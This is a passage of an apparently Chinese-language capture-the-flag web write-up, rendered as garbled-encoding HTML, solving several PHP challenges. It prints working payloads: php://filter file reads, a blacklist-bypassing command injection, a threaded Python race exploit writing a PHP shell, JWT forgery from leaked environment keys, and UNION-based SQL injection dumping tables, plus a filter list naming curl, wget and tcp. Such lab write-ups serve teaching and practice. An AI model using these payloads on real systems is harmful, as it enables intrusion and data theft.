</span></span><span class="line"><span class="cl">        <span class="n">calc_md5</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sl</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">getstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">sl</span><span class="p">,</span> <span class="n">slen</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å­—ç¬¦ä¸²é•¿åº¦ä»0åˆ°30ï¼Œè‚¯å®šæ‰¾å¾—åˆ°</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">getstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡äº†ç¬¬ä¸€ä¸ª ifï¼Œæ¥ä¸‹æ¥éœ€è¦æˆ‘ä»¬ GET ä¸€ä¸ª query ä½¿å¾—ç»è¿‡ preg_replace å•æ¬¡è¿‡æ»¤åä¸º filterã€‚</p>
<p>è€ƒè™‘åŒå†™ç»•è¿‡ï¼Œå³<code>?query=ffilterilter</code>ï¼Œè¿™æ ·å°±å¾—åˆ°äº† $flag1</p>
<p>ç„¶åéœ€è¦å† GET ä¸€ä¸ª verifyï¼Œè¿™é‡Œå‘ç°æœ‰ä¸€è¡Œå¯ç–‘ä»£ç <code>extract($_POST);</code>ï¼Œç›´æ¥ Google</p>
<blockquote>
<p>extract ä¼šå¯¼è‡´å˜é‡è¢«è¦†ç›–ï¼ŒPOST åˆ™ä½¿å¾—å˜é‡å¯æ§</p>
</blockquote>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ POST ä½¿<code>pass=md5(verify)</code>å³å¯ç»•è¿‡</p>
<p>å†è§‚å¯Ÿæœ€åä¸€è¡Œ <code>echo $$verify;</code>ï¼Œå‘ç°æœ‰ä¸¤ä¸ª $$ï¼Œè¿™å°±å…è®¸æˆ‘ä»¬è®¾ç½® verify ä¸ºæŸä¸€ä¸ªå˜é‡ï¼Œå†è·å¾—è¿™ä¸€ä¸ªå˜é‡çš„å€¼ã€‚è€ƒè™‘å‰åŠä¸ª flag  ä¸º $flag1ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹ååŠéƒ¨åˆ† flag ä¸º $flag2</p>
<p>é‚£ä¹ˆååŠéƒ¨åˆ†çš„ payload ä¸º GET  <code>verify=flag2</code>ï¼ŒPOST <code>pass=9a48ddad2656385fce58af47a0ef56cf</code></p>
<h2 id="-black-page">â¬› Black Page</h2>
<p>F12 å‘ç°æç¤º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">phps</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$blacklist</span> <span class="o">=</span> <span class="s2">&#34;(**blacklist**)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$blacklist</span><span class="o">.</span><span class="s2">&#34;/is&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;Nooo,You can&#39;t read it.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">include</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ä½ èƒ½è¯»åˆ° mybackdoor.php å—ï¼Ÿ
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å°è¯•  ?file=mybackdoor.phpï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°å›æ˜¾ã€‚</p>
<blockquote>
<p>å› ä¸ºæ­£å¸¸è¯»å–æ—¶æ˜¯æ— æ³•è¯»å–å®ƒçš„æºç çš„ï¼Œå®ƒä¼šè¢«å½“åš php æ–‡ä»¶æ‰§è¡Œ</p>
<p>php://filter æ˜¯ php ä¸­ç‹¬æœ‰çš„ä¸€ä¸ªåè®®ï¼Œå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–</p>
</blockquote>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>æè¿°</th>
<th style="text-align:center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td>
<td>æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td>
<td style="text-align:center">å¿…é€‰</td>
</tr>
<tr>
<td>read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</td>
<td style="text-align:center">å¯é€‰</td>
</tr>
<tr>
<td>write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td>å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚</td>
<td style="text-align:center">å¯é€‰</td>
</tr>
<tr>
<td>&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;</td>
<td>ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td>
<td style="text-align:center">å¯é€‰</td>
</tr>
</tbody>
</table>
<p>æ‰€ä»¥å¯ä»¥ä½¿ç”¨ <code>?file=php://filter/convert.base64-encode/resource=mybackdoor.php</code>å¾—åˆ° base64 åŠ å¯†çš„æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBibGFja2xpc3QoJGNtZCl7CiAgJGZpbHRlciA9ICIoXFw8fFxcPnxGbDRnfHBocHxjdXJsfCB8MHh8XFxcXHxweXRob258Z2NjfGxlc3N8cm9vdHxldGN8cGFzc3xodHRwfGZ0cHxjZHx0Y3B8dWRwfGNhdHzDl3xmbGFnfHBofGhwfHdnZXR8dHlwZXx0eXxcXCRcXHtJRlNcXH18aW5kZXh8XFwqKSI7CiAgaWYgKHByZWdfbWF0Y2goIi8iLiRmaWx0ZXIuIi9pcyIsJGNtZCk9PTEpeyAgCiAgICAgIGV4aXQoJ0dvIG91dCEgVGhpcyBibGFjayBwYWdlIGRvZXMgbm90IGJlbG9uZyB0byB5b3UhJyk7CiAgfQogIGVsc2V7CiAgICBzeXN0ZW0oJGNtZCk7CiAgfQp9CmJsYWNrbGlzdCgkX0dFVFsnY21kJ10pOwo/Pg==
</span></span></code></pre></td></tr></table>
</div>
</div><p>è§£å¯†åå¾—åˆ°æºç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">blacklist</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&#34;(</span><span class="se">\\</span><span class="s2">&lt;|</span><span class="se">\\</span><span class="s2">&gt;|Fl4g|php|curl| |0x|</span><span class="se">\\\\</span><span class="s2">|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|Ã—|flag|ph|hp|wget|type|ty|</span><span class="se">\\</span><span class="si">$\\</span><span class="s2">{IFS</span><span class="se">\\</span><span class="s2">}|index|</span><span class="se">\\</span><span class="s2">*)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$filter</span><span class="o">.</span><span class="s2">&#34;/is&#34;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>  
</span></span><span class="line"><span class="cl">      <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;Go out! This black page does not belong to you!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">blacklist</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ˜¯é»‘åå•è¿‡æ»¤çš„ rceï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦éšä¾¿ç»•å°±è¡Œäº†</p>
<p>å…ˆè¯»ç›®å½•ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨ %09 ç»•è¿‡ï¼Œ<code>/mybackdoor.php?cmd=ls%09/</code></p>
<p>å‘ç°æ ¹ç›®å½•ä¸‹æœ‰æ–‡ä»¶ Fl4g_is_hereï¼Œä½¿ç”¨ tac å’Œ ? å¯ä»¥ç»•è¿‡ï¼Œ<code>/mybackdoor.php?cmd=tac%09/Fl4?_is_here</code></p>
<h2 id="-å¤ªææŒé—¨äºº">â˜¯ï¸ å¤ªææŒé—¨äºº</h2>
<p>è®¿é—®å¾—åˆ°æºç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">deleteDir</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$dirs</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dirs</span> <span class="k">as</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$dir</span> <span class="o">!=</span> <span class="s1">&#39;.&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$dir</span> <span class="o">!=</span> <span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$sonDir</span> <span class="o">=</span> <span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$dir</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$sonDir</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nx">deleteDir</span><span class="p">(</span><span class="nv">$sonDir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$sonDir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sonDir</span> <span class="o">!==</span> <span class="s1">&#39;./index.php&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$sonDir</span> <span class="o">!==</span> <span class="s1">&#39;./flag.php&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$sonDir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$devil</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php exit;?&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$goods</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;goods&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;train&#39;</span><span class="p">],</span> <span class="nv">$devil</span> <span class="o">.</span> <span class="nv">$goods</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">deleteDir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å®šä¹‰çš„ä¸€å¤§æ®µå‡½æ•°æ˜¯ç”¨æ¥åˆ é™¤ç½‘ç«™ç›®å½•ä¸‹ä½ æ”¾è¿›å»çš„æ–‡ä»¶çš„ï¼Œè€Œé‡ç‚¹å¯åˆ©ç”¨çš„åœ¨æœ€åé¢å‡ è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nv">$goods</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;goods&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;train&#39;</span><span class="p">],</span> <span class="nv">$devil</span> <span class="o">.</span> <span class="nv">$goods</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">deleteDir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¥½ï¼Œå‘ç°å¯ç–‘ä»£ç <code>file_put_contents</code>ï¼Œå¼€å§‹ Google</p>
<p>train ä½œä¸ºå†™å…¥è·¯å¾„ï¼Œ$devil.$goods ä½œä¸ºå†™å…¥å†…å®¹ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode/resource= è¯­å¥å°†å†…å®¹è§£å¯†åå†å†™å…¥æ‰§è¡Œä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠå¼€å¤´çš„é€€å‡ºä»£ç è½¬æ¢ä¸ºä¹±ç è¿‡æ»¤æ‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œbase64 æ˜¯åˆ†ç»„åŠ å¯†çš„ï¼Œæ‰€ä»¥ä¸ºäº†è§£å¯†æ—¶æ¶ˆé™¤å¼€å¤´çš„ $devil ä¸”ä¸å½±å“åé¢çš„å†™å…¥å†…å®¹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å¼€å¤´è¡¥ä¸Šä¸€ä½ã€‚</p>
<p>ç„¶åä¾¿å¯ä»¥åœ¨ sleep(1) å†…è®¿é—®ï¼Œæ‰‹é€Ÿå¿«çš„è¯å¯ä»¥ç›´æ¥åˆ‡ï¼Œé¢„æœŸè§£æ˜¯å¤šçº¿ç¨‹çš„è„šæœ¬ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
</span></span><span class="line"><span class="cl"><span class="n">url1</span> <span class="o">=</span> <span class="s1">&#39;http://8.130.29.197:6002/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">url2</span> <span class="o">=</span> <span class="s1">&#39;http://8.130.29.197:6002/a.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;goods&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&lt;?php system(&#34;cat flag.php&#34;);?&gt;&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;train&#39;</span><span class="p">:</span> <span class="s1">&#39;php://filter/write=convert.base64-decode/resource=a.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-to_be_admin">ğŸ¥³ To_be_Admin</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/A1.jpeg"
        data-srcset="./img/A1.jpeg, ./img/A1.jpeg 1.5x, ./img/A1.jpeg 2x"
        data-sizes="auto"
        alt="./img/A1.jpeg"
        title="A1" /></p>
<p>æ‰“å¼€ç½‘å€ï¼Œçœ‹åˆ°ä¸¤ä¸ªæç¤º <strong>Go to Your page</strong> å’Œ <strong>Access /read to read file what you want.</strong></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/A2.jpeg"
        data-srcset="./img/A2.jpeg, ./img/A2.jpeg 1.5x, ./img/A2.jpeg 2x"
        data-sizes="auto"
        alt="./img/A2.jpeg"
        title="A2" /></p>
<p>ç‚¹å‡»ç¬¬ä¸€ä¸ªæŒ‰é’®è·³è½¬ ./admin å‘ç°æƒé™ä¸å¤Ÿï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç«¯æ˜¯ä¾é ä»€ä¹ˆåˆ¤æ–­æˆ‘ä»¬æ˜¯ä¸æ˜¯ admin çš„å‘¢ï¼Ÿå‘ç° cookie å†…æœ‰</p>
<p>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.STZdzBL4eUV1eQS8V9eJ96m0Q5LTwqBhFw5stXTk89M ï¼ˆç›´æ¥å¼€å§‹ Google</p>
<p>å‘ç°æˆ‘ä»¬éœ€è¦ jwt ä¼ªé€  admin èº«ä»½ï¼Œè€Œä¼ªé€ éœ€è¦å¯†é’¥æ‰èƒ½éªŒè¯ã€‚</p>
<p>åœ¨ /read ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>/read?file=/proc/self/environ</code>è¯»å–ç¯å¢ƒå˜é‡ï¼Œå‘ç° KEY = <code>THIS_is_a_KEY</code>ã€‚</p>
<p>é‚£ä¹ˆåœ¨ <a href="https://jwt.io/" target="_blank" rel="noopener noreffer ">JSON Web Tokens</a> ä¿®æ”¹ jwt ä¿¡æ¯ï¼Œå†è®¿é—® /admin å³å¯</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/2.jpeg"
        data-srcset="./img/2.jpeg, ./img/2.jpeg 1.5x, ./img/2.jpeg 2x"
        data-sizes="auto"
        alt="./img/2.jpeg"
        title="2" /></p>
<h2 id="-ç¬¬ä¸€æ¬¡è·‘è·¯">ğŸƒ ç¬¬ä¸€æ¬¡è·‘è·¯</h2>
<p>æ‰“å¼€æ˜¯æ³¨å†Œç•Œé¢</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run1.png"
        data-srcset="./img/run1.png, ./img/run1.png 1.5x, ./img/run1.png 2x"
        data-sizes="auto"
        alt="./img/run1.png"
        title="run1" /></p>
<p>å…ˆéšä¾¿è¾“ç‚¹å•¥ï¼Œç‚¹å‡»å³ä¾§çš„æ³¨å†Œï¼Œè·³è½¬å›æ˜¾ <strong>åˆ«æƒ³äº†ï¼Œæ­¤è·¯ä¸é€š</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å†çœ‹çœ‹ç™»å½•ç•Œé¢ï¼Œå°è¯• sql æ³¨å…¥ï¼Œè¾“å…¥ username = admin&rsquo;&amp;password = 123 å‘ç°å›æ˜¾ <strong>æˆ‘è¶…ï¼Œæˆ‘ğŸ‘–å‘¢ï¼Ÿ</strong></p>
<p>è¯´æ˜å¯èƒ½å­˜åœ¨ sqliï¼Œä½¿ç”¨ä¸‡èƒ½è´¦å·ç™»å½• <code>username = admin'or+1=1#&amp;password = 123</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run2.png"
        data-srcset="./img/run2.png, ./img/run2.png 1.5x, ./img/run2.png 2x"
        data-sizes="auto"
        alt="./img/run2.png"
        title="run2" /></p>
<p>è·³è½¬åˆ°äº†æ–°çš„é¡µé¢ï¼Œå°è¯•è¿‡åå‘ç° Cookie: username = cnss å¯èƒ½å­˜åœ¨ Cookie çš„ sqliã€‚</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run3.jpeg"
        data-srcset="./img/run3.jpeg, ./img/run3.jpeg 1.5x, ./img/run3.jpeg 2x"
        data-sizes="auto"
        alt="./img/run3.jpeg"
        title="run3" /></p>
<p>å°è¯• username = cnss&rsquo;# ä½†æ˜¯å‘ç°å›æ˜¾æ˜¯éšæœºçš„æˆåŠŸè®¿é—®æˆ–è€…å¤±è´¥ï¼ŒçŒœæµ‹åç«¯æœ‰éšæœºè¿‡æ»¤ï¼ˆè¿™é‡Œæ˜¯ä¸ºäº†å¡ sqlmapï¼‰ï¼Œä½†ä¾ç„¶å¯ä»¥ sqli</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¥—è·¯åŒ–çš„ sqli äº†ï¼Œå…ˆçˆ†åº“å</p>
<p><code>username=-1'union select group_concat(schema_name) from information_schema.schemata#</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run4.jpeg"
        data-srcset="./img/run4.jpeg, ./img/run4.jpeg 1.5x, ./img/run4.jpeg 2x"
        data-sizes="auto"
        alt="./img/run4.jpeg"
        title="run4" /></p>
<p>å†çˆ†è¡¨å</p>
<p><code>username=-1'union select group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run5.jpeg"
        data-srcset="./img/run5.jpeg, ./img/run5.jpeg 1.5x, ./img/run5.jpeg 2x"
        data-sizes="auto"
        alt="./img/run5.jpeg"
        title="run5" /></p>
<p>å†çˆ†åˆ—å</p>
<p><code>username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='user'#</code></p>
<p><code>username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fulage'#</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run6.jpeg"
        data-srcset="./img/run6.jpeg, ./img/run6.jpeg 1.5x, ./img/run6.jpeg 2x"
        data-sizes="auto"
        alt="./img/run6.jpeg"
        title="run6" /></p>
<p>æœ€åè¯»å– flag</p>
<p><code>username = -1'union select bio from CN55.fulage where id =4#</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run7.jpeg"
        data-srcset="./img/run7.jpeg, ./img/run7.jpeg 1.5x, ./img/run7.jpeg 2x"
        data-sizes="auto"
        alt="./img/run7.jpeg"
        title="run7" /></p>
